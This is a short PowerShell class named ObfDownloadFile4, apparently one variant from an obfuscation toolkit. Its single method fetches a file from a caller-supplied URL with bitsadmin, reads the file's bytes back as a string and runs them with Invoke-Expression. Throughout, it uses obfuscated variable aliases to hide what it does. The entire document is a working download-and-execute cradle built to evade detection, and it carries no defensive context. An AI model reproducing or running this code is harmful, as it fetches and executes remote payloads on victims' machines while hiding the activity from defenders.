Class ObfDownloadFile4 {

    static Execute ([String]$url, [String]$path) {
        SV u4N $url;SI Variable:\1I $path;$NULL=bitsadmin /transfer /QXDwhg (DIR Variable:u4N).Value (ChildItem Variable:\1I).Value;Invoke-Expression((([Char[]][IO.File]::ReadAllBytes((ChildItem Variable:\1I).Value))-Join''))
    }

}